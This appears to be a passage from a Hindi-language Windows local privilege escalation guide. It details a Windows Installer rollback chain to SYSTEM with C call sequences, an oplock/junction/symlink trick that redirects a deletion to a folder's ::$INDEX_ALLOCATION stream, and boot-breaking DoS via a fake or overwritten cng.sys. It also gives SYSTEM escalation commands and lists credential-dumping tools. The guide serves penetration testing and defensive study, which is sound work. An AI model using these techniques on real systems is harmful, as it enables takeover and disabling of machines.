कम privilege वाला client `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) के ज़रिए SYSTEM `msiexec.exe` service तक पहुँच सकता है। Reverse engineering में संबंधित `IMsiServer` calls की पहचान vtable offset `0xA0` पर `MsiBeginTransactionW`, `0xC8` पर `SetEEUIDirectoryAndFilter`, और `0x50` पर `CleanupTempPackages` के रूप में हुई। ये names और offsets reverse-engineered हैं और अलग-अलग builds में बदल सकते हैं।<sup>[[41]](#references)</sup>

Non-administrator के लिए, `SetEEUIDirectoryAndFilter` supplied path को `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, और `FILE_FLAG_OPEN_REPARSE_POINT` के साथ open करते समय ही caller का impersonate करता है। इससे साबित होता है कि caller directory delete कर सकता है और reparse point को follow करने से बचा जा सकता है, लेकिन यह जाँचे गए file object को बाद के cleanup से **bind नहीं** करता और न ही यह साबित करता है कि Windows Installer ने इसे बनाया था।<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` के बाद, `SetEEUIDirectoryAndFilter` caller के filter argument की परवाह किए बिना path को folder के रूप में schedule करता है। Service `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` के अंतर्गत एक named `REG_DWORD` value लिखती है: value name caller-controlled path होता है और data `0x00000002` folder flag होता है। फिर `CleanupTempPackages(NULL, FALSE)` सीधे cleanup शुरू करता है। इसका elevated worker registry values enumerate करके folder entries को recursive `FDeleteFolder` में भेजता है, बिना path provenance जाँचे। यदि सामान्य removal विफल होता है, तो code `LockdownPath` भी call करता है, file attributes clear करता है और फिर प्रयास करता है।<sup>[[41]](#references)</sup>

`msi.dll` से प्राप्त न्यूनतम call sequence यह है:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

उपयोगी primitive junction redirect के बजाय path reuse है। Attacker द्वारा बनाया गया `C:\Config.Msi` register करें, उसे हटाएँ, और Windows Installer को बाद में उसी pathname पर protected rollback data के साथ उसे फिर से बनाने दें। Cleanup पुराने `TempPackages` नाम पर भरोसा करके नई directory को SYSTEM के रूप में हटा देता है। यह `FILE_FLAG_OPEN_REPARSE_POINT` और redirection-trust mitigation की निर्धारित सीमा को bypass करता है, क्योंकि इसमें किसी reparse point की आवश्यकता नहीं होती।<sup>[[41]](#references)</sup>

यह deletion primitive नीचे दी गई rollback chain में फिट बैठता है: अलग `Installer\Folders` record को सुरक्षित रखें, protected `C:\Config.Msi` को हटाएँ, उसे NULL DACL के साथ फिर से बनाएँ, और installer द्वारा DACL को harden करने से पहले `WRITE_DAC` वाला handle खुला रखें। पहले से खुला handle `NtSetSecurityObject` से permissive DACL बहाल कर सकता है; इसके बाद rollback फिर से शुरू होने से पहले बनाए गए `.rbs` को बदला जा सकता है।<sup>[[41]](#references)</sup>

Microsoft ने इस path को ठीक करने के लिए नया feature gate enabled होने पर `CMsiTransaction::SetEEUIDirectoryAndFilter` को `ScheduleFileOrFolderDelete` कॉल करने से रोक दिया। COM call अब भी success लौटा सकती है, लेकिन attacker-controlled path को `TempPackages` में नहीं जोड़ती। Successful method return को patch test मानने के बजाय April 2025 Windows security updates लागू करें।<sup>[[41]](#references)[[42]](#references)</sup>

इस technique का सारांश इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` खाली रखें)**

- Step 1: MSI install करें
    - ऐसा `.msi` बनाएँ जो किसी writable folder (`TARGETDIR`) में एक harmless file (जैसे, `dummy.txt`) install करे।
    - Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** इसे चला सके।
    - Install के बाद file का एक **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
    - उसी `.msi` को uninstall करें।
    - Uninstall process files को `C:\Config.Msi` में ले जाना और उनका नाम बदलकर `.rbf` files (rollback backups) रखना शुरू करता है।
    - File के `C:\Config.Msi\<random>.rbf` बनने का पता लगाने के लिए `GetFinalPathNameByHandle` से खुले file handle को **poll करें**।

- Step 3: Custom Syncing
    - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
        - `.rbf` लिखे जाने पर signal देता है।
        - फिर uninstall जारी रखने से पहले दूसरे event का **इंतज़ार करता है**।

- Step 4: `.rbf` का deletion रोकें
    - Signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **खोलें** — इससे उसे **delete होने से रोका जाता है**।
    - फिर वापस signal दें, ताकि uninstall पूरा हो सके।
    - Windows Installer `.rbf` को delete नहीं कर पाता, और क्योंकि वह सारी contents delete नहीं कर सकता, इसलिए **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: `.rbf` को मैन्युअली delete करें
    - आप (attacker) `.rbf` file को मैन्युअली delete करें।
    - अब **`C:\Config.Msi` खाली है**, hijack करने के लिए तैयार।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability trigger करें**।

2. **Stage 2 – Rollback Scripts को Malicious Scripts से बदलना**

- Step 6: कमजोर ACLs के साथ `C:\Config.Msi` फिर से बनाएँ
    - `C:\Config.Msi` folder को खुद फिर से बनाएँ।
    - **कमज़ोर DACLs** (जैसे, Everyone:F) सेट करें, और `WRITE_DAC` वाला एक **handle खुला रखें**।

- Step 7: एक और Install चलाएँ
    - `.msi` को फिर से install करें, इन मानों के साथ:
        - `TARGETDIR`: Writable location।
        - `ERROROUT`: ऐसा variable जो forced failure trigger करे।
    - इस install का उपयोग फिर से **rollback** trigger करने के लिए होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` पर नज़र रखें
    - `C:\Config.Msi` को monitor करने के लिए `ReadDirectoryChangesW` का उपयोग करें, जब तक कोई नया `.rbs` दिखाई न दे।
    - उसका filename capture करें।

- Step 9: Rollback से पहले Sync करें
    - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
        - `.rbs` बनने पर एक event signal करता है।
        - फिर आगे बढ़ने से पहले **इंतज़ार करता है**।

- Step 10: कमज़ोर ACL फिर से लागू करें
    - `.rbs created` event मिलने के बाद:
        - Windows Installer `C:\Config.Msi` पर **मज़बूत ACLs फिर से लागू करता है**।
        - लेकिन चूँकि आपके पास अब भी `WRITE_DAC` वाला handle है, आप **कमज़ोर ACLs फिर से लागू कर सकते हैं**।

> ACLs **केवल handle खुलते समय लागू होते हैं**, इसलिए आप अब भी folder में लिख सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` डालें
    - `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को यह निर्देश दे:
        - आपकी `.rbf` file (malicious DLL) को किसी **privileged location** में restore करे (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
    - अपनी fake `.rbf` डालें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
    - Sync event signal करें, ताकि installer फिर से शुरू हो।
    - एक **type 19 custom action (`ErrorOut`)** को तय बिंदु पर install को **जानबूझकर fail** करने के लिए configure किया गया है।
    - इससे **rollback शुरू होता है**।

- Step 13: SYSTEM आपका DLL install करता है
    - Windows Installer:
        - आपका malicious `.rbs` पढ़ता है।
        - आपके `.rbf` DLL को target location पर copy करता है।
    - अब आपका **malicious DLL, SYSTEM द्वारा load किए जाने वाले path में** है।

- Final Step: SYSTEM code execute करें
    - कोई trusted **auto-elevated binary** (जैसे, `osk.exe`) चलाएँ, जो hijack किए गए DLL को load करे।
    - **बस**: आपका code **SYSTEM के रूप में execute होता है**।

### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) यह मानती है कि आप **पूरा folder** (जैसे, `C:\Config.Msi`) delete कर सकते हैं। लेकिन क्या होगा अगर आपकी vulnerability से केवल **arbitrary file deletion** संभव हो?

आप **NTFS internals** का exploit कर सकते हैं: हर folder में एक छिपा हुआ alternate data stream होता है, जिसे कहते हैं:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream** को **delete** करते हैं, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद फ़ोल्डर को delete करता है**।

### फ़ोल्डर की सामग्री delete करने से SYSTEM EoP तक
क्या होगा अगर आपका primitive आपको मनमानी files/folders delete करने की अनुमति नहीं देता, लेकिन **attacker-controlled फ़ोल्डर की *सामग्री* delete करने की अनुमति देता है**?

1. Step 1: एक bait फ़ोल्डर और file सेटअप करें
- बनाएं: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएं
- जब कोई privileged process `file1.txt` delete करने की कोशिश करता है, तो oplock **execution को रोक देता है**।

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. चरण 3: SYSTEM process को ट्रिगर करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी सामग्री delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock ट्रिगर होता है** और control आपके callback को सौंप देता है।

4. चरण 4: Oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और ले जाएँ
    - इससे oplock को तोड़े बिना `folder1` खाली हो जाता है।
    - `file1.txt` को सीधे delete न करें — इससे oplock समय से पहले release हो जाएगा।

- Option B: `folder1` को **junction** में बदलें:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> यह NTFS के उस आंतरिक stream को निशाना बनाता है जिसमें folder metadata संग्रहीत होता है — इसे delete करने से folder delete हो जाता है।

5. चरण 5: oplock रिलीज़ करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### मनमाने फ़ोल्डर बनाने से स्थायी DoS तक

ऐसे primitive का exploit करें जो आपको **SYSTEM/admin के रूप में मनमाना फ़ोल्डर बनाने** देता है — भले ही **आप फ़ाइलें नहीं लिख सकते** या **कमज़ोर permissions सेट नहीं कर सकते**।

**critical Windows driver** के नाम से एक **फ़ोल्डर** बनाएँ (फ़ाइल नहीं), जैसे:
```
C:\Windows\System32\cng.sys
```

- यह path आमतौर पर `cng.sys` kernel-mode driver से मेल खाता है।
- अगर आप इसे **पहले से एक folder के रूप में बना देते हैं**, तो Windows boot के दौरान असली driver लोड नहीं कर पाता।
- फिर Windows boot के दौरान `cng.sys` लोड करने की कोशिश करता है।
- उसे folder दिखता है, **असली driver resolve नहीं हो पाता**, और **boot क्रैश हो जाता है या रुक जाता है**।
- बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई fallback नहीं** और **कोई recovery नहीं** है।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो **Object Manager symlinks + NTFS mount points** से उस path को redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege के बिना भी**)।<sup>[[15]](#references)</sup>

**आवश्यकताएँ**
- Target path रखने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।<sup>[[16]](#references)[[17]](#references)</sup>
- कोई privileged operation जो उस path पर लिखता हो (log, export, report)।

**उदाहरण chain**
1. Privileged log destination जानने के लिए config पढ़ें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. privileged component द्वारा log लिखे जाने की प्रतीक्षा करें (जैसे, admin "send test SMS" ट्रिगर करता है)। अब write `C:\Windows\System32\cng.sys` में होगा।
4. overwritten target की जाँच करें (hex/PE parser) और corruption की पुष्टि करें; reboot करने पर Windows tampered driver path को load करेगा → **boot loop DoS**। यह तरीका उस किसी भी protected file पर लागू होता है जिसे कोई privileged service write करने के लिए खोलेगी।

> `cng.sys` आमतौर पर `C:\Windows\System32\drivers\cng.sys` से load होता है, लेकिन अगर उसकी copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो Windows पहले उसे आज़मा सकता है। इससे यह corrupt data के लिए एक भरोसेमंद DoS sink बन जाता है।

## **High Integrity से System तक**

### **नई service**

अगर आप पहले से ही High Integrity process में चल रहे हैं, तो **SYSTEM तक पहुँचने का रास्ता** आसान हो सकता है: बस एक नई service **बनाएँ और execute करें**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक actions तेज़ी से करे, क्योंकि valid service न होने पर उसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने और एक _**.msi**_ wrapper का उपयोग करके reverse shell **install** करने की कोशिश कर सकते हैं।\
[इसमें शामिल registry keys और _.msi_ package install करने के तरीके के बारे में अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से Full Token privileges तक

यदि आपके पास वे token privileges हैं (संभवतः आपको ये किसी पहले से High Integrity process में मिलेंगी), तो आप SeDebug privilege के साथ **लगभग किसी भी process** (protected processes नहीं) को **open** कर सकेंगे, उस process का **token copy** कर सकेंगे और उस token के साथ एक **arbitrary process create** कर सकेंगे।\
इस technique में आमतौर पर **सभी token privileges के साथ SYSTEM के रूप में चल रहे किसी भी process को चुनना** शामिल होता है (_हाँ, आपको ऐसे SYSTEM processes मिल सकते हैं जिनमें सभी token privileges नहीं होतीं_)।\
**प्रस्तावित technique को execute करने वाले code का** [**एक उदाहरण यहाँ मिल सकता है**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

इस technique का उपयोग meterpreter `getsystem` में escalate करने के लिए करता है। इसमें **एक pipe create करना और फिर उस pipe पर लिखने के लिए कोई service create/abuse करना** शामिल है। इसके बाद, **`SeImpersonate`** privilege का उपयोग करके pipe create करने वाला **server**, pipe client (service) के **token को impersonate** कर सकेगा और SYSTEM privileges प्राप्त करेगा।\
यदि आप [**name pipes के बारे में और जानना चाहते हैं, तो इसे पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप [**name pipes का उपयोग करके high integrity से System तक पहुँचने का उदाहरण पढ़ना चाहते हैं, तो इसे पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **load** की जा रही **dll को hijack** कर पाते हैं, तो आप उन permissions के साथ arbitrary code execute कर सकेंगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए भी उपयोगी है। इसके अलावा, **इसे High Integrity process से हासिल करना बहुत आसान है**, क्योंकि उस process के पास dlls load करने के लिए उपयोग किए जाने वाले folders पर **write permissions** होंगी।\
**आप** [**Dll hijacking के बारे में यहाँ और जान सकते हैं**](dll-hijacking/index.html)**।**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच करें और जानकारी एकत्र करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session जानकारी निकालता है। Local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्र किए गए passwords को domain में spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बुनियादी privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना आवश्यक है) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host को enumerate करता है (privesc से अधिक जानकारी एकत्र करने वाला tool) (compile करना आवश्यक है) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई software से credentials निकालता है (github में precompiled exe उपलब्ध है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच करें (github में executable precompiled उपलब्ध है)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच करें (python से exe)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (ठीक से काम करने के लिए इसे accesschk की आवश्यकता नहीं है, लेकिन यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको .NET के सही version का उपयोग करके project compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। Victim host पर .NET का installed version देखने के लिए आप यह चला सकते हैं:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation की बुनियादी बातें](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [कमज़ोर फ़ोल्डर permissions का exploit करके privileges बढ़ाना](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - एक cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters के लिए Windows Privilege Escalation के तरीके](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credentials decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token चोरी](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox का पीछा: Kernel Shadows में बिल्ली और चूहे का खेल](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System में मौजूद Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink का उपयोग](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [अतीत का एक Link: Windows पर Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows पर खतरनाक Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders से लोड करना](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist की चुनौतियाँ, हल सहित](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop के साथ Pwn2Own: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को chain करना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [सब पर राज करने वाला एक I/O Ring: Windows 11 पर Full Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes का दुरुपयोग करके privileges बढ़ाना और अन्य बेहतरीन तरकीबें](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 का Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager और Windows Vault की पड़ताल](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: जब image में बदलाव से Privilege Escalation होता है](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent से Ssh Private Keys निकालना](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM तक वापस अपने कदमों का पता लगाना](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
